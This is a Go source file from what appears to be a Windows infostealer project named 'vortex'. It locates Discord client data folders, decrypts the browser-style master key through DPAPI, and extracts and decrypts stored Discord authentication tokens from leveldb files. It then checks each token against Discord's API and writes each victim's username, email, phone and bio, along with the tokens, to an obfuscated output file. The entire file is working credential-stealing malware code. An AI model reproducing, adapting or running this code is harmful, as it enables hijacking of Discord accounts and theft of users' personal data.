//go:build windows

package messenger

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"encoding/json"
	"errors"
	"io"
	"net/http"
	"os"
	"path/filepath"
	"regexp"
	"strings"
	"unsafe"
	"vortex/encrypt"
	"vortex/hutil"
	"vortex/telehandler"

	"github.com/olekukonko/tablewriter"
	"golang.org/x/sys/windows"
)

type osCrypt struct {
	osCrypt key `json:"os_crypt"`
}

type key struct {
	EncryptedKey string `json:"encrypted_key"`
}

type discordData struct {
	username    string `json:"username"`
	email       string `json:"email"`
	phonenumber string `json:"phone"`
	bio         string `json:"bio"`
}

func bytesToBlob(bytes []byte) *windows.DataBlob {
	blob := &windows.DataBlob{Size: uint32(len(bytes))}
	if len(bytes) > 0 {
		blob.Data = &bytes[0]
	}
	return blob
}

func decryptMasterKey(data []byte) ([]byte, error) {

	out := windows.DataBlob{}
	var outName *uint16

	err := windows.CryptUnprotectData(bytesToBlob(data), &outName, nil, 0, nil, 0, &out)
	if err != nil {
		return nil, err
	}
	ret := make([]byte, out.Size)
	copy(ret, unsafe.Slice(out.Data, out.Size))

	windows.LocalFree(windows.Handle(unsafe.Pointer(out.Data)))
	windows.LocalFree(windows.Handle(unsafe.Pointer(outName)))

	return ret, nil
}

func getDiscordMasterKey(discordPath string) ([]byte, error) {
	var oc osCrypt

	masterkeyJFile := filepath.Join(discordPath, "Local State")
	byteVal, err := os.ReadFile(masterkeyJFile)
	if err != nil {
		return nil, err
	}

	json.Unmarshal(byteVal, &oc)
	baseEncMasterKey := oc.osCrypt.EncryptedKey
	encMasterKey, err := base64.StdEncoding.DecodeString(baseEncMasterKey)
	if err != nil {
		return nil, err
	}
	masterKey, err := decryptMasterKey(encMasterKey[5:])
	if err != nil {
		return nil, err
	}

	return masterKey, nil
}

func decryptDiscordEncryptedToken(encToken []byte, masterKey []byte) (string, error) {

	IV := encToken[3:15]
	payload := encToken[15:]

	block, err := aes.NewCipher(masterKey)
	if err != nil {
		return "", err
	}

	aesGCM, err := cipher.NewGCM(block)
	if err != nil {
		return "", err
	}

	if len(payload) < len(IV) {
		return "", errors.New("Incorrect IV , Too big")
	}

	decToken, err := aesGCM.Open(nil, IV, payload, nil)
	if err != nil {
		return "", err
	}

	return string(decToken), nil
}

func getEncryptedTokens(discordPath string, masterKey []byte) []string {

	var tokenList []string
	tokenRegex := regexp.MustCompile("dQw4w9WgXcQ:[^\"]*")
	tokenPath := filepath.Join(discordPath, "Local Storage", "leveldb")
	files, _ := os.ReadDir(tokenPath)
	for _, file := range files {
		if strings.HasSuffix(file.Name(), ".log") || strings.HasSuffix(file.Name(), ".ldb") {
			fileContent, _ := os.ReadFile(filepath.Join(tokenPath, file.Name()))
			fileLines := bytes.Split(fileContent, []byte("\\n"))
			for _, line := range fileLines {
				match := tokenRegex.Find(line)
				if len(match) > 0 {
					baseToken := strings.SplitAfterN(string(match), "dQw4w9WgXcQ:", 2)[1]
					encryptedToken, _ := base64.StdEncoding.DecodeString(baseToken)
					token, _ := decryptDiscordEncryptedToken(encryptedToken, masterKey)
					tokenList = append(tokenList, string(token))
				}
			}
		}
	}
	return tokenList
}

func getDecryptedTokens(discordPath string) []string {

	var tokenList []string
	tokenRegex := regexp.MustCompile(`[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}`)
	tokenPath := filepath.Join(discordPath, "Local Storage", "leveldb")
	files, _ := os.ReadDir(tokenPath)

	for _, file := range files {
		if strings.HasSuffix(file.Name(), ".log") || strings.HasSuffix(file.Name(), ".ldb") {
			fileContent, _ := os.ReadFile(filepath.Join(tokenPath, file.Name()))
			fileLines := bytes.Split(fileContent, []byte("\\n"))
			for _, line := range fileLines {
				match := tokenRegex.Find(line)
				if len(match) > 0 {
					tokenList = append(tokenList, string(match))
				}
			}
		}
	}
	return tokenList
}

func validateDiscordToken(token string) (discordData, bool, error) {

	data := discordData{}

	req, err := http.NewRequest("GET", "https://discord.com/api/v9/users/@me", nil)
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("User-Agent", telehandler.UserAgent)
	req.Header.Set("Authorization", token)
	if err != nil {
		return data, false, err
	}

	client := &http.Client{}
	resp, err := client.Do(req)

	if resp.StatusCode != 200 {
		return data, false, nil
	}
	defer resp.Body.Close()

	msgBody, err := io.ReadAll(resp.Body)
	if err != nil {
		return data, false, err
	}

	json.Unmarshal(msgBody, &data)

	return data, true, nil

}

func getDiscordPotentialPath() ([]string, error) {
	var validPaths []string
	potentialPaths := []string{
		filepath.Join(os.Getenv("APPDATA"), "Lightcord"),
		filepath.Join(os.Getenv("APPDATA"), "Discord"),
		filepath.Join(os.Getenv("APPDATA"), "discordcanary"),
		filepath.Join(os.Getenv("APPDATA"), "discordptb"),
	}

	for _, path := range potentialPaths {
		if _, err := os.Stat(path); !os.IsNotExist(err) {
			validPaths = append(validPaths, path)
		}
	}

	if len(validPaths) != 0 {
		return validPaths, nil
	}

	return nil, nil
}

func DiscordDataDump(mainFolder string) error {
	path, err := getDiscordPotentialPath()
	if err != nil {
		return err
	}
	if path == nil {
		return nil
	}

	discordFile := filepath.Join(mainFolder, encrypt.B64Util("discord.txt", 0))
	file, err := os.Create(discordFile)
	if err != nil {
		return err
	}
	defer file.Close()

	creds := tablewriter.NewWriter(file)
	creds.SetHeader([]string{
		"Username",
		"Email",
		"PhoneNumber",
		"Bio",
		"Tokens",
		"Validation",
	})

	for i := range path {

		if strings.Contains(path[i], "cord") {
			masterKey, err := getDiscordMasterKey(path[i])
			if err != nil {
				return err
			}
			token := getEncryptedTokens(path[i], masterKey)
			for i := range token {
				data, valid, err := validateDiscordToken(token[i])
				if err != nil {
					return err
				}
				if valid {
					creds.Append([]string{
						data.username,
						data.email,
						data.phonenumber,
						data.bio,
						token[i],
						"Yes",
					})
					hutil.PasswordCounter++
				} else {
					creds.Append([]string{"", "", "", "", token[i], "No"})
					hutil.PasswordCounter++
				}
			}
		} else {
			token := getDecryptedTokens(path[i])
			for i := range token {
				data, valid, err := validateDiscordToken(token[i])
				if err != nil {
					return err
				}
				if valid {
					creds.Append([]string{
						data.username,
						data.email,
						data.phonenumber,
						data.bio,
						token[i],
						"Yes",
					})
					hutil.PasswordCounter++
				} else {
					creds.Append([]string{"", "", "", "", token[i], "No"})
					hutil.PasswordCounter++
				}
			}
		}
	}
	creds.Render()

	return nil

}
